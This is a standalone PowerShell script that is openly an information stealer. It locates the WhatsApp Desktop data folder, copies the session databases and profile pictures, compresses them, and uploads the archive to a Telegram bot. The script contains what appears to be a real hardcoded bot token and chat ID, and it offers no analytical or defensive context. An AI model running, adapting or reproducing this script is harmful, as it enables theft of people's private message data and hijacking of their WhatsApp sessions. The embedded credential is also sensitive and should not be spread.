function whatsappstealer {
    $whatsapp_session = "$folder_messaging\Whatsapp"
    New-Item -ItemType Directory -Force -Path $whatsapp_session | Out-Null
    $regexPattern = "^[a-z0-9]+\.WhatsAppDesktop_[a-z0-9]+$"
    $parentFolder = Get-ChildItem -Path "$env:localappdata\Packages" -Directory | Where-Object { $_.Name -match $regexPattern }
    if ($parentFolder) {
        $localStateFolders = Get-ChildItem -Path $parentFolder.FullName -Filter "LocalState" -Recurse -Directory
        foreach ($localStateFolder in $localStateFolders) {
            $profilePicturesFolder = Get-ChildItem -Path $localStateFolder.FullName -Filter "profilePictures" -Recurse -Directory
            if ($profilePicturesFolder) {
                $destinationPath = Join-Path -Path $whatsapp_session -ChildPath $localStateFolder.Name
                $profilePicturesDestination = Join-Path -Path $destinationPath -ChildPath "profilePictures"
                Copy-Item -Path $profilePicturesFolder.FullName -Destination $profilePicturesDestination -Recurse -ErrorAction SilentlyContinue
            }
        }
        foreach ($localStateFolder in $localStateFolders) {
            $filesToCopy = Get-ChildItem -Path $localStateFolder.FullName -File | Where-Object { $_.Length -le 10MB -and $_.Name -match "(?i)\.db$|\.db-wal|\.dat$" }
            $destinationPath = Join-Path -Path $whatsapp_session -ChildPath $localStateFolder.Name
            Copy-Item -Path $filesToCopy.FullName -Destination $destinationPath -Recurse 
        }
    }

    # Compress the WhatsApp session folder to a zip file
    $zipPathWhatsApp = "$env:TEMP\whatsapp_session.zip"
    Compress-Archive -Path $whatsapp_session -DestinationPath $zipPathWhatsApp -Force
}

function sendToTelegram {
    param (
        [string]$zipPath
    )
    
    # Send the zip file to Telegram bot
    $telegramBotToken = "6746792763:AAE8STn2Y5aDtKOrsrMZs-O4ePN0gc64kX4"  # Replace with your bot token
    $chatId = "1074750898"              # Replace with your chat ID

    $telegramApiUrl = "https://api.telegram.org/bot$telegramBotToken/sendDocument"

    $boundary = [System.Guid]::NewGuid().ToString()
    $headers = @{
        "Content-Type" = "multipart/form-data; boundary=`"$boundary`""
    }

    $fileContent = [IO.File]::ReadAllBytes($zipPath)
    $bodyLines = @(
        "--$boundary",
        "Content-Disposition: form-data; name=`"chat_id`"",
        "",
        "$chatId",
        "--$boundary",
        "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $zipPath -Leaf)`"",
        "Content-Type: application/zip",
        "",
        [System.Text.Encoding]::UTF8.GetString($fileContent),
        "--$boundary--"
    )
    $body = [System.String]::Join("`r`n", $bodyLines)

    Invoke-RestMethod -Uri $telegramApiUrl -Method Post -Headers $headers -Body $body
}

# Run the WhatsApp stealer
whatsappstealer

# Send the WhatsApp zip file to Telegram
sendToTelegram -zipPath "$env:TEMP\whatsapp_session.zip"
